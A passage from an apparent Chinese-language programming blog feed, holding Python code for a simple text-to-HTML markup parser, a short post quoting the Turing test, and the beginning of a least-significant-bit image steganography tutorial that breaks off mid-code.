HTML&#x5904;&#x7406;&#x7A0B;&#x5E8F;,&#x7ED9;&#x6587;&#x672C;&#x5757;&#x52A0;&#x76F8;&#x5E94;&#x7684;HTML&#x6807;&#x8BB0;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start_document</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">&apos;&lt;html&gt;&lt;head&gt;&lt;title&gt;ShiYanLou&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&apos;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">end_document</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">&apos;&lt;/body&gt;&lt;/html&gt;&apos;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start_paragraph</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">&apos;&lt;p style=&quot;color: #444;&quot;&gt;&apos;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">end_paragraph</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">&apos;&lt;/p&gt;&apos;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start_heading</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">&apos;&lt;h2 style=&quot;color: #68BE5D;&quot;&gt;&apos;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">end_heading</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">&apos;&lt;/h2&gt;&apos;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start_list</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">&apos;&lt;ul style=&quot;color: #363736;&quot;&gt;&apos;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">end_list</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">&apos;&lt;/ul&gt;&apos;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start_listitem</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">&apos;&lt;li&gt;&apos;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">end_listitem</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">&apos;&lt;/li&gt;&apos;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">start_title</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">&apos;&lt;h1 style=&quot;color: #1ABC9C;&quot;&gt;&apos;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">end_title</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">&apos;&lt;/h1&gt;&apos;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sub_emphasis</span><span class="params">(self, match)</span>:</span></span><br><span class="line">        <span class="keyword">return</span>(<span class="string">&apos;&lt;em&gt;%s&lt;/em&gt;&apos;</span> % match.group(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sub_url</span><span class="params">(self, match)</span>:</span></span><br><span class="line">        <span class="keyword">return</span>(<span class="string">&apos;&lt;a target=&quot;_blank&quot; style=&quot;text-decoration: none;color: #BC1A4B;&quot; href=&quot;%s&quot;&gt;%s&lt;/a&gt;&apos;</span> % (match.group(<span class="number">1</span>), match.group(<span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sub_mail</span><span class="params">(self, match)</span>:</span></span><br><span class="line">        <span class="keyword">return</span>(<span class="string">&apos;&lt;a style=&quot;text-decoration: none;color: #BC1A4B;&quot; href=&quot;mailto:%s&quot;&gt;%s&lt;/a&gt;&apos;</span> % (match.group(<span class="number">1</span>), match.group(<span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">feed</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        print(data)</span><br></pre></td></tr></tbody></table></figure><p></p><p>rules.py<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rule</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &#x89C4;&#x5219;&#x7236;&#x7C7B;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">action</span><span class="params">(self, block, handler)</span>:</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &#x52A0;&#x6807;&#x8BB0;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        handler.start(self.type)</span><br><span class="line">        handler.feed(block)</span><br><span class="line">        handler.end(self.type)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeadingRule</span><span class="params">(Rule)</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &#x4E00;&#x53F7;&#x6807;&#x9898;&#x89C4;&#x5219;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    type = <span class="string">&apos;heading&apos;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">condition</span><span class="params">(self, block)</span>:</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &#x5224;&#x65AD;&#x6587;&#x672C;&#x5757;&#x662F;&#x5426;&#x7B26;&#x5408;&#x89C4;&#x5219;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">not</span> <span class="string">&apos;\n&apos;</span> <span class="keyword">in</span> block <span class="keyword">and</span> len(block) &lt;= <span class="number">70</span> <span class="keyword">and</span> <span class="keyword">not</span> block[<span class="number">-1</span>] == <span class="string">&apos;:&apos;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TitleRule</span><span class="params">(HeadingRule)</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &#x4E8C;&#x53F7;&#x6807;&#x9898;&#x89C4;&#x5219;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    type = <span class="string">&apos;title&apos;</span></span><br><span class="line">    first = <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">condition</span><span class="params">(self, block)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.first: <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        self.first = <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">return</span> HeadingRule.condition(self, block);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListItemRule</span><span class="params">(Rule)</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &#x5217;&#x8868;&#x9879;&#x89C4;&#x5219;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    type = <span class="string">&apos;listitem&apos;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">condition</span><span class="params">(self, block)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> block[<span class="number">0</span>] == <span class="string">&apos;-&apos;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">action</span><span class="params">(self, block, handler)</span>:</span></span><br><span class="line">        handler.start(self.type)</span><br><span class="line">        handler.feed(block[<span class="number">1</span>:].strip())</span><br><span class="line">        handler.end(self.type)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListRule</span><span class="params">(ListItemRule)</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &#x5217;&#x8868;&#x89C4;&#x5219;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    type = <span class="string">&apos;list&apos;</span></span><br><span class="line">    inside = <span class="keyword">False</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">condition</span><span class="params">(self, block)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">action</span><span class="params">(self, block, handler)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.inside <span class="keyword">and</span> ListItemRule.condition(self, block):</span><br><span class="line">            handler.start(self.type)</span><br><span class="line">            self.inside = <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">elif</span> self.inside <span class="keyword">and</span> <span class="keyword">not</span> ListItemRule.condition(self, block):</span><br><span class="line">            handler.end(self.type)</span><br><span class="line">            self.inside = <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ParagraphRule</span><span class="params">(Rule)</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &#x6BB5;&#x843D;&#x89C4;&#x5219;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    type = <span class="string">&apos;paragraph&apos;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">condition</span><span class="params">(self, block)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>markup.py<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys, re</span><br><span class="line"><span class="keyword">from</span> handlers <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> util <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> rules <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parser</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &#x89E3;&#x6790;&#x5668;&#x7236;&#x7C7B;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, handler)</span>:</span></span><br><span class="line">        self.handler = handler</span><br><span class="line">        self.rules = []</span><br><span class="line">        self.filters = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">addRule</span><span class="params">(self, rule)</span>:</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &#x6DFB;&#x52A0;&#x89C4;&#x5219;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.rules.append(rule)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">addFilter</span><span class="params">(self, pattern, name)</span>:</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &#x6DFB;&#x52A0;&#x8FC7;&#x6EE4;&#x5668;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">filter</span><span class="params">(block, handler)</span>:</span></span><br><span class="line">            <span class="keyword">return</span> re.sub(pattern, handler.sub(name), block)</span><br><span class="line">        self.filters.append(filter)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self, file)</span>:</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &#x89E3;&#x6790;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.handler.start(<span class="string">&apos;document&apos;</span>)</span><br><span class="line">        <span class="keyword">for</span> block <span class="keyword">in</span> blocks(file):</span><br><span class="line">            <span class="keyword">for</span> filter <span class="keyword">in</span> self.filters:</span><br><span class="line">                block = filter(block, self.handler)</span><br><span class="line">            <span class="keyword">for</span> rule <span class="keyword">in</span> self.rules:</span><br><span class="line">                <span class="keyword">if</span> rule.condition(block):</span><br><span class="line">                    last = rule.action(block, self.handler)</span><br><span class="line">                    <span class="keyword">if</span> last: <span class="keyword">break</span></span><br><span class="line">        self.handler.end(<span class="string">&apos;document&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BasicTextParser</span><span class="params">(Parser)</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &#x7EAF;&#x6587;&#x672C;&#x89E3;&#x6790;&#x5668;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, handler)</span>:</span></span><br><span class="line">        Parser.__init__(self, handler)</span><br><span class="line">        self.addRule(ListRule())</span><br><span class="line">        self.addRule(ListItemRule())</span><br><span class="line">        self.addRule(TitleRule())</span><br><span class="line">        self.addRule(HeadingRule())</span><br><span class="line">        self.addRule(ParagraphRule())</span><br><span class="line"></span><br><span class="line">        self.addFilter(<span class="string">r&apos;\*(.+?)\*&apos;</span>, <span class="string">&apos;emphasis&apos;</span>)</span><br><span class="line">        self.addFilter(<span class="string">r&apos;(http://[\.a-zA-Z/]+)&apos;</span>, <span class="string">&apos;url&apos;</span>)</span><br><span class="line">        self.addFilter(<span class="string">r&apos;([\.a-zA-Z]+@[\.a-zA-Z]+[a-zA-Z]+)&apos;</span>, <span class="string">&apos;mail&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&#x8FD0;&#x884C;&#x7A0B;&#x5E8F;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">handler = HTMLRenderer()</span><br><span class="line">parser = BasicTextParser(handler)</span><br><span class="line">parser.parse(sys.stdin)</span><br></pre></td></tr></tbody></table></figure><p></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Turing machine and Turing test</title>
      <link href="/2018/10/11/Turing-machine-and-Turing-test/"/>
      <url>/2018/10/11/Turing-machine-and-Turing-test/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/resize_images.jpeg" alt=""></p><a id="more"></a><p>&#x81EA;&#x5DF1;&#x5C0F;&#x7684;&#x65F6;&#x5019;&#x5C31;&#x559C;&#x6B22;&#x601D;&#x8003;&#x751F;&#x4E0E;&#x6B7B;&#x8FD9;&#x6837;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x6709;&#x65F6;&#x5019;&#x8FD8;&#x4F1A;&#x5E7B;&#x60F3;&#x81EA;&#x5DF1;&#x80FD;&#x4E0D;&#x80FD;&#x957F;&#x751F;&#x4E0D;&#x6B7B;&#xFF0C;&#x73B0;&#x5728;&#x60F3;&#x60F3;&#x90A3;&#x65F6;&#x5019;&#x80FD;&#x591F;&#x8FD9;&#x6837;&#x60F3;&#x662F;&#x591A;&#x4E48;&#x7684;&#x5E78;&#x798F;&#xFF0C;&#x800C;&#x73B0;&#x5728;&#x6709;&#x8FD9;&#x6837;&#x7684;&#x60F3;&#x6CD5;&#x662F;&#x591A;&#x4E48;&#x7684;&#x5962;&#x4F88;&#x2026;&#x2026;</p><p>&#x56FE;&#x7075;&#x6D4B;&#x8BD5;&#xFF1A;</p><blockquote><p>&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x4EBA;&#xFF08;&#x4EE3;&#x53F7;C&#xFF09;&#x4F7F;&#x7528;&#x6D4B;&#x8BD5;&#x5BF9;&#x8C61;&#x7686;&#x7406;&#x89E3;&#x7684;&#x8BED;&#x8A00;&#x53BB;&#x8BE2;&#x95EE;&#x4E24;&#x4E2A;&#x4ED6;&#x4E0D;&#x80FD;&#x770B;&#x89C1;&#x7684;&#x5BF9;&#x8C61;&#x4EFB;&#x610F;&#x4E00;&#x4E32;&#x95EE;&#x9898;&#x3002;&#x5BF9;&#x8C61;&#x4E3A;&#xFF1A;&#x4E00;&#x4E2A;&#x662F;&#x6B63;&#x5E38;&#x601D;&#x7EF4;&#x7684;&#x4EBA;&#xFF08;&#x4EE3;&#x53F7;B&#xFF09;&#x3001;&#x4E00;&#x4E2A;&#x662F;&#x673A;&#x5668;&#xFF08;&#x4EE3;&#x53F7;A&#xFF09;&#x3002;&#x5982;&#x679C;&#x7ECF;&#x8FC7;&#x82E5;&#x5E72;&#x8BE2;&#x95EE;&#x4EE5;&#x540E;&#xFF0C;C&#x4E0D;&#x80FD;&#x5F97;&#x51FA;&#x5B9E;&#x8D28;&#x7684;&#x533A;&#x522B;&#x6765;&#x5206;&#x8FA8;A&#x4E0E;B&#x7684;&#x4E0D;&#x540C;&#xFF0C;&#x5219;&#x6B64;&#x673A;&#x5668;A&#x901A;&#x8FC7;&#x56FE;&#x7075;&#x6D4B;&#x8BD5;&#x3002;</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python3 image steganography</title>
      <link href="/2018/10/11/Python3-image-steganography/"/>
      <url>/2018/10/11/Python3-image-steganography/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/1473383473422.png" alt=""><br><a id="more"></a></p><p>&#x5927;&#x81F4;&#x5206;&#x6790;&#x4E86;&#x4E00;&#x4E0B;&#xFF0C;&#x8FD8;&#x6709;&#x5F88;&#x591A;&#x5730;&#x65B9;&#x6CA1;&#x6709;&#x5F04;&#x660E;&#x767D;&#x3002;</p><p>code:<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&#x53D6;&#x5F97;&#x4E00;&#x4E2A; PIL &#x56FE;&#x50CF;&#x5E76;&#x4E14;&#x66F4;&#x6539;&#x6240;&#x6709;&#x503C;&#x4E3A;&#x5076;&#x6570;&#xFF08;&#x4F7F;&#x6700;&#x4F4E;&#x6709;&#x6548;&#x4F4D;&#x4E3A; 0&#xFF09;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makeImageEven</span><span class="params">(image)</span>:</span></span><br><span class="line">    pixels = list(image.getdata())  <span class="comment"># &#x5F97;&#x5230;&#x4E00;&#x4E2A;&#x8FD9;&#x6837;&#x7684;&#x5217;&#x8868;&#xFF1A; [(r,g,b,t),(r,g,b,t)...]</span></span><br><span class="line">    evenPixels = [(r&gt;&gt;<span class="number">1</span>&lt;&lt;<span class="number">1</span>,g&gt;&gt;<span class="number">1</span>&lt;&lt;<span class="number">1</span>,b&gt;&gt;<span class="number">1</span>&lt;&lt;<span class="number">1</span>,t&gt;&gt;<span class="number">1</span>&lt;&lt;<span class="number">1</span>) <span class="keyword">for</span> [r,g,b,t] <span class="keyword">in</span> pixels]  <span class="comment"># &#x66F4;&#x6539;&#x6240;&#x6709;&#x503C;&#x4E3A;&#x5076;&#x6570;&#xFF08;&#x9B54;&#x6CD5;&#x822C;&#x7684;&#x79FB;&#x4F4D;&#xFF09;</span></span><br><span class="line">    evenImage = Image.new(image.mode, image.size)  <span class="comment"># &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x76F8;&#x540C;&#x5927;&#x5C0F;&#x7684;&#x56FE;&#x7247;&#x526F;&#x672C;</span></span><br><span class="line">    evenImage.putdata(evenPixels)  <span class="comment"># &#x628A;&#x4E0A;&#x9762;&#x7684;&#x50CF;&#x7D20;&#x653E;&#x5165;&#x5230;&#x56FE;&#x7247;&#x526F;&#x672C;</span></span><br><span class="line">    <span class="keyword">return</span> evenImage</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&#x5185;&#x7F6E;&#x51FD;&#x6570; bin() &#x7684;&#x66FF;&#x4EE3;&#xFF0C;&#x8FD4;&#x56DE;&#x56FA;&#x5B9A;&#x957F;&#x5EA6;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">constLenBin</span><span class="params">(int)</span>:</span></span><br><span class="line">    binary = <span class="string">&quot;0&quot;</span>*(<span class="number">8</span>-(len(bin(int))<span class="number">-2</span>))+bin(int).replace(<span class="string">&apos;0b&apos;</span>,<span class="string">&apos;&apos;</span>)  <span class="comment"># &#x53BB;&#x6389; bin() &#x8FD4;&#x56DE;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32;&#x4E2D;&#x7684; &apos;0b&apos;&#xFF0C;&#x5E76;&#x5728;&#x5DE6;&#x8FB9;&#x8865;&#x8DB3; &apos;0&apos; &#x76F4;&#x5230;&#x5B57;&#x7B26;&#x4E32;&#x957F;&#x5EA6;&#x4E3A; 8</span></span><br><span class="line">    <span class="keyword">return</span> binary</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&#x5C06;&#x5B57;&#x7B26;&#x4E32;&#x7F16;&#x7801;&#x5230;&#x56FE;&#x7247;&#x4E2D;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encodeDataInImage</span><span class="params">(image, data)</span>:</span></span><br><span class="line">    evenImage = makeImageEven(image)  <span class="comment"># &#x83B7;&#x5F97;&#x6700;&#x4F4E;&#x6709;&#x6548;&#x4F4D;&#x4E3A; 0 &#x7684;&#x56FE;&#x7247;&#x526F;&#x672C;</span></span><br><span class="line">    binary = <span class="string">&apos;&apos;</span>.join(map(constLenBin,bytearray(data, <span class="string">&apos;utf-8&apos;</span>))) <span class="comment"># &#x5C06;&#x9700;&#x8981;&#x88AB;&#x9690;&#x85CF;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x8F6C;&#x6362;&#x6210;&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32;</span></span><br><span class="line">    <span class="keyword">if</span> len(binary) &gt; len(image.getdata()) * <span class="number">4</span>:  <span class="comment"># &#x5982;&#x679C;&#x4E0D;&#x53EF;&#x80FD;&#x7F16;&#x7801;&#x5168;&#x90E8;&#x6570;&#x636E;&#xFF0C; &#x629B;&#x51FA;&#x5F02;&#x5E38;</span></span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;Error: Can&apos;t encode more than &quot;</span> + len(evenImage.getdata()) * <span class="number">4</span> + <span class="string">&quot; bits in this image. &quot;</span>)</span><br><span class="line">    encodedPixels = [(r+int(binary[index*<span class="number">4</span>+<span class="number">0</span>]),g+int(binary[index*<span class="number">4</span>+<span class="number">1</span>]),b+int(binary[index*<span class="number">4</span>+<span class="number">2</span>]),t+int(binary[index*<span class="number">4</span>+<span class="number">3</span>])) <span class="keyword">if</span> index*<span class="number">4</span> &lt; 